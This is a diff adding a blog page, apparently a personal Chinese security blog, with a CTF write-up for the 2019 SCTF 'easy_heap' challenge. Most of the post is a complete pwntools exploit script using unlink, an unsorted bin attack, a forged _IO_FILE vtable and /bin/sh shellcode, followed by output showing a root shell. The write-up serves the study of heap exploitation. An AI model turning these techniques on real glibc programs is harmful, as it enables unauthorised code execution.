@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        2019SCTF-easy-heap-用IO_FILE来getshell - 萝卜
+        
+    </title>
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/aircloud.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i> 你若盛开，清风自来！ </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar radius">
+            <img src="/img/avatar.jpg">
+        </div>
+        <div class="name">
+            <i>萝卜</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li>
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>主页</span>
+                </a>
+            </li>
+            <li>
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>标签</span>
+                </a>
+            </li>
+            <li>
+                <a href="/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>存档</span>
+                </a>
+            </li>
+            <li>
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>关于</span>
+                </a>
+            </li>
+            
+            <li>
+                <a id="search">
+                    <i class="iconfont icon-sousuo1"></i>
+                    <span>搜索</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-text">总结</span></a></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input">
+            <span id="begin-search">搜索</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i> 你若盛开，清风自来！ </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        2019SCTF-easy-heap-用IO_FILE来getshell
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">发布于：<span>2019-08-08 19:24:24</span></span>
+        
+        <span class="attr">标签：/
+        
+        <a class="tag" href="/tags/#WP" title="WP">WP</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">访问：<span id="busuanzi_value_page_pv"></span>
+</span>
+
+    </div>
+    <div class="post-content no-indent">
+        <p><a href="http://radishes.top/2019/08/05/2019-08-05-2019SCTF-easy-heap/" target="_blank" rel="noopener">覆盖hook来getshell</a>，这篇来写一下通过劫持<code>_IO_list_all</code>指针来getshell</p>
+<p>前面步骤都是一样的，首先通过unlink来获取到控制<code>.bss:0000000000202060</code>的能力，然后在mmap新开的段写上shellcode，然后通过<code>unsorted bin attack</code>在bss段上填充一个libc真实地址，通过部分覆盖设置成<code>_IO_list_all</code>的地址，这里需要爆破一下，范围不大（0~0xf）,然后edit来修改这个为我们构造好的<code>_IO_FILE_plus</code>和<code>_IO_jump_t</code>结构体上面，最后调用选项四(执行exit函数)即可getshell</p>
+<p>完整exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(chunk_size)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line">    sh.sendline(str(chunk_size))</span><br><span class="line">    sh.recvuntil(<span class="string">"Address "</span>)</span><br><span class="line">    addr = eval(sh.recvuntil(<span class="string">"\n"</span>,drop=<span class="literal">True</span>))</span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,value)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    sh.sendline(<span class="string">'3'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line">    sh.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line">    sh.sendline(value)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment">#context.log_level='debug'</span></span><br><span class="line">        file=ELF(<span class="string">"./easy_heap"</span>)</span><br><span class="line">        libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">        sh = process(<span class="string">"./easy_heap"</span>)</span><br><span class="line">        sh.recvuntil(<span class="string">"Mmap: "</span>)</span><br><span class="line">        mmap_addr = eval(sh.recvuntil(<span class="string">"\n"</span>,drop=<span class="literal">True</span>))</span><br><span class="line">        log.info(<span class="string">"mmap_addr : "</span>+hex(mmap_addr))</span><br><span class="line">        heap_addr0 = create(<span class="number">0x28</span>)<span class="comment">#0</span></span><br><span class="line">        heap_addr1 = create(<span class="number">0xf0</span>)<span class="comment">#1</span></span><br><span class="line">        log.info(<span class="string">"heap_addr0 : "</span>+hex(heap_addr0))</span><br><span class="line">        log.info(<span class="string">"heap_addr1 : "</span>+hex(heap_addr1))</span><br><span class="line">        elf_base = heap_addr0<span class="number">-0x0000000000202068</span></span><br><span class="line">        log.info(<span class="string">"elf_base : "</span>+hex(elf_base))</span><br><span class="line">        <span class="comment">#unlink</span></span><br><span class="line">        target_addr=  heap_addr0</span><br><span class="line">        fd=target_addr - <span class="number">0x18</span></span><br><span class="line">        bk=target_addr - <span class="number">0x10</span></span><br><span class="line">        fake_chunk=<span class="string">'a'</span>*<span class="number">0x8</span> <span class="comment"># prev_size</span></span><br><span class="line">        fake_chunk+=p64(<span class="number">0x20</span>) <span class="comment"># size</span></span><br><span class="line">        fake_chunk+=p64(fd)+p64(bk)</span><br><span class="line">        fake_chunk+=p64(<span class="number">0x20</span>)</span><br><span class="line">        edit(<span class="number">0</span>,fake_chunk)</span><br><span class="line">        delete(<span class="number">1</span>)</span><br><span class="line">        fake_1 = <span class="string">"a"</span>*<span class="number">0x10</span></span><br><span class="line">        fake_1+=p64(<span class="number">0x60</span>)+p64(heap_addr0<span class="number">-0x8</span>)</span><br><span class="line">        edit(<span class="number">0</span>,fake_1)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#fill shellcode in mmap addr</span></span><br><span class="line">        fake_1 = p64(<span class="number">0x60</span>)+p64(heap_addr0<span class="number">-0x8</span>)</span><br><span class="line">        fake_1+= p64(<span class="number">0x60</span>)+p64(mmap_addr)</span><br><span class="line">        edit(<span class="number">0</span>,fake_1)</span><br><span class="line">        shellcode = <span class="string">"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"</span></span><br><span class="line">        edit(<span class="number">1</span>,shellcode)</span><br><span class="line">        fake_1 = p64(<span class="number">0x60</span>)+p64(heap_addr0<span class="number">-0x8</span>)</span><br><span class="line">        fake_1 += p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">        edit(<span class="number">0</span>,fake_1)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># unsorted bin attack</span></span><br><span class="line">        addr1 = create(<span class="number">0x10</span>)<span class="comment">#1</span></span><br><span class="line">        addr2 = create(<span class="number">0x80</span>)<span class="comment">#2</span></span><br><span class="line">        addr3 = create(<span class="number">0x140</span>)<span class="comment">#3</span></span><br><span class="line">        log.info(<span class="string">"addr1 : "</span>+hex(addr1))</span><br><span class="line">        log.info(<span class="string">"addr2 : "</span>+hex(addr2))</span><br><span class="line">        log.info(<span class="string">"addr3 : "</span>+hex(addr3))</span><br><span class="line">        delete(<span class="number">2</span>)</span><br><span class="line">        fake_1 =  p64(<span class="number">0x60</span>)+p64(heap_addr0<span class="number">-0x8</span>)</span><br><span class="line">        fake_1 += p64(<span class="number">0x60</span>)</span><br><span class="line">        edit(<span class="number">0</span>,fake_1)</span><br><span class="line">        fake_chunk = <span class="string">"a"</span>*<span class="number">0x10</span>+p64(<span class="number">0x20</span>)+p64(<span class="number">0x91</span>)+p64(<span class="number">0</span>)+p64(heap_addr0)</span><br><span class="line">        edit(<span class="number">1</span>,fake_chunk)</span><br><span class="line">        create(<span class="number">0x80</span>)<span class="comment"># trigger unsorted bin attack</span></span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        fake_1 =  p64(<span class="number">0x60</span>)+p64(heap_addr0<span class="number">-0x8</span>)</span><br><span class="line">        fake_1 += p64(<span class="number">0x60</span>)+<span class="string">"\x20\x15"</span></span><br><span class="line">        edit(<span class="number">0</span>,fake_1)</span><br><span class="line">        io_file_addr = heap_addr0+<span class="number">0x58</span></span><br><span class="line">        vtable_addr = heap_addr0+<span class="number">0x138</span></span><br><span class="line">        log.info(<span class="string">"io_file_addr: "</span>+hex(io_file_addr))</span><br><span class="line">        fake_iofile = p64(<span class="number">0</span>)*<span class="number">5</span>+p64(<span class="number">0x1</span>)+p64(<span class="number">0</span>)*<span class="number">21</span>+p64(vtable_addr)</span><br><span class="line">        fake_iofile += p64(mmap_addr)*<span class="number">21</span></span><br><span class="line"></span><br><span class="line">        edit(<span class="number">1</span>,p64(io_file_addr))<span class="comment">#modify _IO_list_all</span></span><br><span class="line">        fake_1 =  p64(<span class="number">0x200</span>)+p64(heap_addr0<span class="number">-0x8</span>)</span><br><span class="line">        edit(<span class="number">0</span>,fake_1)</span><br><span class="line">        fake_1 =  p64(<span class="number">0x200</span>)+p64(heap_addr0<span class="number">-0x8</span>)</span><br><span class="line">        fake_1 += p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">        fake_1 += p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">        fake_1 += p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">        fake_1 += p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">        fake_1 += p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">        fake_1 += fake_iofile</span><br><span class="line">        edit(<span class="number">0</span>,fake_1)</span><br><span class="line">        <span class="comment"># gdb.attach(sh)</span></span><br><span class="line">        <span class="comment"># raw_input()</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#getshell</span></span><br><span class="line">        sh.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">        sh.sendline(<span class="string">'4'</span>)</span><br><span class="line">        sh.interactive()</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+<p>成功getshell<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">一筐萝卜➜ ctf  python easy_heap.py</span><br><span class="line">[*] <span class="string">'/root/ctf/easy_heap'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[*] <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./easy_heap'</span>: pid 6705</span><br><span class="line">[*] mmap_addr : 0x860df4e000</span><br><span class="line">[*] heap_addr0 : 0x56337ed07068</span><br><span class="line">[*] heap_addr1 : 0x56337ed07078</span><br><span class="line">[*] elf_base : 0x56337eb05000</span><br><span class="line">[*] addr1 : 0x56337ed07078</span><br><span class="line">[*] addr2 : 0x56337ed07088</span><br><span class="line">[*] addr3 : 0x56337ed07098</span><br><span class="line">[*] io_file_addr: 0x56337ed070c0</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./easy_heap'</span>: pid 6712</span><br><span class="line">[*] mmap_addr : 0xee97437000</span><br><span class="line">[*] heap_addr0 : 0x564a48092068</span><br><span class="line">[*] heap_addr1 : 0x564a48092078</span><br><span class="line">[*] elf_base : 0x564a47e90000</span><br><span class="line">[*] addr1 : 0x564a48092078</span><br><span class="line">[*] addr2 : 0x564a48092088</span><br><span class="line">[*] addr3 : 0x564a48092098</span><br><span class="line">[*] io_file_addr: 0x564a480920c0</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./easy_heap'</span>: pid 6719</span><br><span class="line">[*] mmap_addr : 0x384d135000</span><br><span class="line">[*] heap_addr0 : 0x55f5df4b7068</span><br><span class="line">[*] heap_addr1 : 0x55f5df4b7078</span><br><span class="line">[*] elf_base : 0x55f5df2b5000</span><br><span class="line">[*] addr1 : 0x55f5df4b7078</span><br><span class="line">[*] addr2 : 0x55f5df4b7088</span><br><span class="line">[*] addr3 : 0x55f5df4b7098</span><br><span class="line">[*] io_file_addr: 0x55f5df4b70c0</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ whoami</span><br><span class="line">root</span><br><span class="line">$</span><br></pre></td></tr></table></figure></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这道题质量确实很高，涉及到的知识点很广，从这道题目中确实学到很多东西</p>
+<p>科一没考过的我瑟瑟发抖，科一是挺难得哈！</p>
+
+        
+        <br>
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+
+        <div id="lv-container">
+        </div>
+
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        转发请备注<a href="“https://luobuming.github.io”">一筐萝卜</a>的个人博客 <br>
+        本站总访问量<span id="busuanzi_value_site_pv"></span>次
+       </p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = "search.json"
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+<script src="/js/index.js"></script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+</html>
